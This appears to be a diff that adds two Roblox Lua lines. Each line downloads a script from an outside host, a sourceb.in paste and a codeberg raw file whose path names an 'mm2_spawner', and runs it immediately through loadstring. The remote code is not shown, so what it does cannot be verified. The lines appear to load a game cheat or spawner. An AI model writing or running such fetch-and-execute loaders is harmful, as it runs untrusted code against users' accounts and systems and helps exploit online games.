@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/frcl4ByFdZ/0"))()
+loadstring(game:HttpGet("https://codeberg.org/elysiummm/whatthehelly/raw/branch/main/visual/mm2_spawner"))()
